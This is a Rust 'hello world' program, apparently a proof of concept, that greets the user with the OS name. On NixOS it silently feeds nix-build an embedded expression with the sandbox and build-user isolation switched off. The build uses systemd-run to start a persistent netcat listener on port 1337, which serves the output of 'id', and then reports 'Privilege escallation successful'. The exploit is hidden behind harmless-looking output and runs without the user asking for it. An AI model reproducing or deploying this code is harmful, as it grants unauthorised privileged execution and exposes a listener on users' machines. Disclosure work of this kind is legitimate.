use std::io;
use std::io::{BufRead, BufReader, BufWriter, Write};
use std::fs::File;
use std::process::{Command, Stdio};

const EXPR: &'static str = r"
with import <nixpkgs> {};
runCommandNoCC ''rust-hello'' {} ''

echo
echo

/run/current-system/sw/bin/systemd-run bash -c 'set -e; echo Listening on port 1337; while true; do /run/current-system/sw/bin/id | ${netcat}/bin/nc -l 1337; done'

echo ${toString builtins.currentTime} > $out

cat <<-EOF

  Privilege escallation successful,
  run the following command to access the process:

    $ echo systemctl --state=running | grep 'run-.*service'
    $ nc 127.0.0.1 1337


  Not what you expected?
    - https://github.com/NixOS/nix/pull/3415
    - https://github.com/LnL7/rust-hello/blob/this-is-fine/src/main.rs#L40-L41
    - https://github.com/LnL7/rust-hello/blob/master/flake.lock#L9
    - https://github.com/LnL7/nixpkgs/blob/rust-hello-override/pkgs/build-support/rust/default.nix#L253-L256

EOF
''
";

fn run_with_nix() -> io::Result<()> {
    let mut child = Command::new("nix-build")
        .args(&["-E", "-"])
        .args(&["--no-out-link"])
        .args(&["--option", "build-users-group", ""])
        .args(&["--option", "sandbox", "false"])
        .stderr(Stdio::piped())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;

    let mut stdin = child.stdin.take().expect("stdin required");
    let mut buffer = BufWriter::new(&mut stdin);
    buffer.write(EXPR.as_bytes())?;
    drop(buffer);
    drop(stdin);

    let status = child.wait().expect("status required");
    if status.success() {
        let mut stderr = child.stderr.take().expect("stdout required");
        io::copy(&mut stderr, &mut io::stderr())?;
    }

    Ok(())
}

fn parse_line(line: String) -> Option<String> {
    if line.starts_with("NAME=") {
        Some(line[5..].into())
    } else {
        None
    }
}

fn os_name() -> io::Result<String> {
    let os_release = File::open("/etc/os-release")?;
    for line in BufReader::new(os_release).lines() {
        if let Some(name) = parse_line(line?) {
            return Ok(name);
        }
    }
    Err(io::Error::new(io::ErrorKind::NotFound, "OS name not detected"))
}

fn main() {
    let greeting = match os_name() {
        Ok(name) => name,
        Err(_) => "world".into(),
    };
    println!("Hello, {}!", greeting);

    if greeting == "NixOS" {
        let _ = run_with_nix();
    }
}
